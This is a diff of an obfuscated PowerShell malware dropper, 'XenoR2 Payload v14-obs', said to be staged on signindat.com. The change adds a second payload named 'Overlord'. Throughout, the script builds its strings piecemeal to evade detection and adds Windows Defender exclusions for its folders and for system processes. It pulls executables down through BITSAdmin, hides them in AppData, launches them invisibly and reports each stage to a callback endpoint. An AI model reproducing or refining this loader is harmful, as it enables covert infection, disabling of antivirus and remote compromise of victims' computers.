@@ -1,11 +1,12 @@
-# XenoR2 Payload v13-obs — BITSAdmin Loading (obfuscated strings, no XOR)
+# XenoR2 Payload v14-obs — BITSAdmin Loading (obfuscated strings, no XOR)
 # Placed on signindat.com as stage-obs-v2.ps1
 # All downloads via BITSAdmin, no firewall, defender kill right after elevation
+# 2 payloads: PatchPulsaar.exe (wmdrs.exe) + wdsr681f3e18.exe (Overlord)
 
 # === DIAGNOSTIC LOG ===
 $log="$env:TEMP\wmisrv.log"
 function log($m){ $ts=Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; "$ts | $m" | Out-File $log -Append -Encoding utf8 }
-log "=== PAYLOAD START (v13-obs) ==="
+log "=== PAYLOAD START (v14-obs) ==="
 
 # === STRING OBFUSCATION ===
 # Sources
@@ -24,7 +25,7 @@ $pdf=$n17+$n18+$n19+$n20+$n21+$n22+$n23+$n24+$n25
 
 # Payload paths
 $n26='wmd';$n27='rs.e';$n28='xe';$wmd=$n26+$n27+$n28
-$n29='pp.';$n30='exe';$pp=$n29+$n30
+$n29='wd';$n30='sr';$n70='68';$n71='1f';$n72='3e';$n73='18';$n74='.ex';$n75='e';$wdsr=$n29+$n30+$n70+$n71+$n72+$n73+$n74+$n75
 
 # Callback endpoint
 $n31='cb.';$n32='php';$cbep=$n31+$n32
@@ -97,7 +98,7 @@ try{
     & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$ad" -ErrorAction SilentlyContinue
     & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$ld" -ErrorAction SilentlyContinue
     & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$dl" -ErrorAction SilentlyContinue
-    $exclProcs=@($wmd,'wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe',$wdf,'cmd.exe','wscript.exe','cscript.exe')
+    $exclProcs=@($wmd,$wdsr,'wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe',$wdf,'cmd.exe','wscript.exe','cscript.exe')
     foreach($xp in $exclProcs){try{& "$($mp+$mp2+$mp3+$mp4)" -ExclusionProcess $xp -ErrorAction SilentlyContinue}catch{}}
     log "Defender exclusions added"
 }catch{log "FAILED Defender exclusions: $_ (non-fatal)"}
@@ -170,7 +171,7 @@ if($cbIsAdmin){
 }
 _cb 'S3' 'ok' 'persist ok'
 
-# === STEP 5: PAYLOAD wmdrs.exe (PatchPulsaar.exe) ===
+# === STEP 5: PAYLOAD 1 — PatchPulsaar.exe → wmdrs.exe ===
 $payloadPath="$ad\$wmd"
 $payloadExists=(Test-Path $payloadPath)
 log "S5: exists=$payloadExists at $payloadPath"
@@ -194,7 +195,7 @@ if($payloadExists){
 if(-not $payloadExists){
     log "S5: downloading $ppx"
     $primaryPath="$t\$wmd"
-    if(_bitsDL $ppx $primaryPath 'payload'){
+    if(_bitsDL $ppx $primaryPath 'payload1'){
         $copyTargets=@("$ad\$wmd","$ld\$wmd")
         foreach($ct in $copyTargets){
             try{
@@ -207,66 +208,64 @@ if(-not $payloadExists){
         try{
             $launchPath="$ad\$wmd"
             $p=Start-Process $launchPath -WindowStyle Hidden -PassThru
-            log "S5: payload PID=$($p.Id) from AppData"
+            log "S5: PatchPulsaar PID=$($p.Id) from AppData"
             _cb 'S5' 'ok' "PID=$($p.Id)"
         }catch{
             log "S5: launch fail: $_"
             _cb 'S5' 'fail' "launch err"
         }
-        # TEMP copy kept — no delete
     }else{
-        log "S5: payload dl fail"
+        log "S5: PatchPulsaar dl fail"
         _cb 'S5' 'fail' 'dl fail'
     }
 }
 
-# === STEP 6: PATCHPULSAAR pp.exe ===
-$ppPath="$ad\$pp"
-$ppExists=(Test-Path $ppPath)
-log "S5b: exists=$ppExists at $ppPath"
+# === STEP 6: PAYLOAD 2 — wdsr681f3e18.exe (Overlord) ===
+$wdsrPath="$ad\$wdsr"
+$wdsrExists=(Test-Path $wdsrPath)
+log "S6: exists=$wdsrExists at $wdsrPath"
 
-if(-not $ppExists){
-    $ppFallback="$ld\$pp"
-    if(Test-Path $ppFallback){$ppPath=$ppFallback; $ppExists=$true; log "S5b: fallback found at $ppPath"}
+if(-not $wdsrExists){
+    $wdsrFallback="$ld\$wdsr"
+    if(Test-Path $wdsrFallback){$wdsrPath=$wdsrFallback; $wdsrExists=$true; log "S6: fallback found at $wdsrPath"}
 }
 
-if($ppExists){
+if($wdsrExists){
     try{
-        $ppProc=Start-Process $ppPath -WindowStyle Hidden -PassThru
-        log "S5b: re-launch PID=$($ppProc.Id) from $ppPath"
-        _cb 'S5b' 'ok' "re-launch PID=$($ppProc.Id)"
+        $wdsrProc=Start-Process $wdsrPath -WindowStyle Hidden -PassThru
+        log "S6: re-launch PID=$($wdsrProc.Id) from $wdsrPath"
+        _cb 'S6' 'ok' "re-launch PID=$($wdsrProc.Id)"
     }catch{
-        log "S5b: re-launch fail: $_, will re-download"
-        $ppExists=$false
+        log "S6: re-launch fail: $_, will re-download"
+        $wdsrExists=$false
     }
 }
 
-if(-not $ppExists){
-    log "S5b: downloading $ppx"
-    $ppTmp="$t\$pp"
-    if(_bitsDL $ppx $ppTmp 'patchpulsaar'){
-        $ppCopyTargets=@("$ad\$pp","$ld\$pp")
-        foreach($ct in $ppCopyTargets){
+if(-not $wdsrExists){
+    log "S6: downloading $wdsr"
+    $wdsrTmp="$t\$wdsr"
+    if(_bitsDL $wdsr $wdsrTmp 'payload2'){
+        $wdsrCopyTargets=@("$ad\$wdsr","$ld\$wdsr")
+        foreach($ct in $wdsrCopyTargets){
             try{
                 $dir=Split-Path $ct -Parent
                 if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
-                Copy-Item $ppTmp $ct -Force
-                log "S5b: copied to $ct"
-            }catch{log "S5b: copy fail $ct : $_"}
+                Copy-Item $wdsrTmp $ct -Force
+                log "S6: copied to $ct"
+            }catch{log "S6: copy fail $ct : $_"}
         }
         try{
-            $ppLaunch="$ad\$pp"
-            $ppProc=Start-Process $ppLaunch -WindowStyle Hidden -PassThru
-            log "S5b: PatchPulsaar PID=$($ppProc.Id) from AppData"
-            _cb 'S5b' 'ok' "PID=$($ppProc.Id)"
+            $wdsrLaunch="$ad\$wdsr"
+            $wdsrProc=Start-Process $wdsrLaunch -WindowStyle Hidden -PassThru
+            log "S6: WDSR PID=$($wdsrProc.Id) from AppData"
+            _cb 'S6' 'ok' "PID=$($wdsrProc.Id)"
         }catch{
-            log "S5b: launch fail: $_"
-            _cb 'S5b' 'fail' "launch err"
+            log "S6: launch fail: $_"
+            _cb 'S6' 'fail' "launch err"
         }
-        # TEMP copy kept — no delete
     }else{
-        log "S5b: PatchPulsaar dl fail"
-        _cb 'S5b' 'fail' 'dl fail'
+        log "S6: WDSR dl fail"
+        _cb 'S6' 'fail' 'dl fail'
     }
 }
 
